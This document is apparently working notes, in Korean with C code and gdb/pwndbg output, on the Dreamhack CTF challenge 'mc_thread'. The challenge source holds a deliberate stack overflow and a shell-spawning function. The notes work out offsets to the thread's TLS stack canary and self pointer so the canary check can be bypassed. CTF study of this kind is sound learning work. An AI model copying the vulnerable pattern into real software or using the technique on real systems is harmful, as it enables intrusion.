```c
// Name: mc_thread.c
// Compile: gcc -o mc_thread mc_thread.c -pthread -no-pie
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```

---
```c
(gdb) x/gx $rbp - 0x110
0x7fa0af707d40:	0x0000000000000000
(gdb) x/10gx $rbp - 0x110
0x7fa0af707d40:	0x0000000000000000	0x0000000000000000
0x7fa0af707d50:	0x0000000000000000	0x0000000000000000
0x7fa0af707d60:	0x0000000000000000	0x0000000000000000
0x7fa0af707d70:	0x0000000000000000	0x0000000000000000
0x7fa0af707d80:	0x0000000000000000	0x0000000000000000
(gdb) x/gx $fs_base + 0x28
0x7fa0af708668:	0x31ea6531b18fae00
(gdb) p/x 0x7fa0af708668-0x7fa0af707d40   
$1 = 0x928
(gdb) 

```

$fs_base + 0x28 => canary - $rbp - 0x110 => buf
=> offset 0x928

---

```c
(gdb) p *(struct pthread *)$fs_base
$5 = {{header = {tcb = 0x7f9cb4329640, dtv = 0x9cab2b0, self = 0x7f9cb4329640, 
      multiple_threads = 1, gscope_flag = 0, sysinfo = 0, 
      stack_guard = 3092669159404714496, pointer_guard = 2820334784216064204, 
      unused_vgetcpu_cache = {0, 0}, feature_1 = 0, __glibc_unused1 = 0, 
      __private_tm = {0x0, 0x0, 0x0, 0x0}, __private_ss = 0x0, ssp_base = 0, 
      __glibc_unused2 = {{{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 
              0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {
            i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 
              0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 
              0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{
            i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 
              0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 
              0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {
            i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 
              0, 0, 0}}, 
```

---
$fs_base에 있는값을 (struct pthread) 형식으로 해석하여 출력
여기서 self를 그냥 덮게 된다면 문제가 발생함 
```c
       struct pthread *self = THREAD_SELF;
63     self->canceltype = PTHREAD_CANCEL_DEFERRED;
64 }
65 libc_hidden_def (__pthread_disable_asynccancel)
66
67
68
69
70
71
72
73
74
75
76
77
78
-------------------------------------------------------------------
multi-thre Thread 0x7f5d06b886 In: __GI___pthread_disable_asynccancel       L63   PC: 0x7f5d06c1caf2
--------------------------------------------------------------------
pwndbg> disass $rip
Dump of assembler code for function __GI___pthread_disable_asynccancel:
   0x00007f5d06c1cae0 <+0>:	endbr64 
   0x00007f5d06c1cae4 <+4>:	cmp    edi,0x1
   0x00007f5d06c1cae7 <+7>:	je     0x7f5d06c1caf9 <__GI___pthread_disable_asynccancel+25>
   0x00007f5d06c1cae9 <+9>:	mov    rax,QWORD PTR fs:0x10
=> 0x00007f5d06c1caf2 <+18>:	mov    BYTE PTR [rax+0x972],0x0
   0x00007f5d06c1caf9 <+25>:	ret    
End of assembler dump.
pwndbg> 

```
이 self 안에있는 canceltype을 건들때 에러가 발생하는데 이때 rax + 972 값을 참조하여 해당 영역이 유효하지않아서 에러 발생한것

---
```c
pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 
0x400000 0x401000 r--p 1000 0 /home/dreamhack/mc_thread 
0x401000 0x402000 r-xp 1000 1000 /home/dreamhack/mc_thread 
0x402000 0x403000 r--p 1000 2000 /home/dreamhack/mc_thread 
0x403000 0x404000 r--p 1000 2000 /home/dreamhack/mc_thread 
0x404000 0x405000 rw-p 1000 3000 /home/dreamhack/mc_thread
```
쓰기 권한이있는 0x404000 0x405000 쯤 영역 그중에서도 0x4043000영역을 참조할예정

---
```c
(gdb) x/gx &((struct pthread *)$fs_base)->header.self
0x7f9cb4329650:	0x00007f9cb4329640
(gdb) p/x 0x7f9cb4329650 - 0x7f9cb4328d40
$7 = 0x910
(gdb) 
```
self 구조체와 buf간의 offset
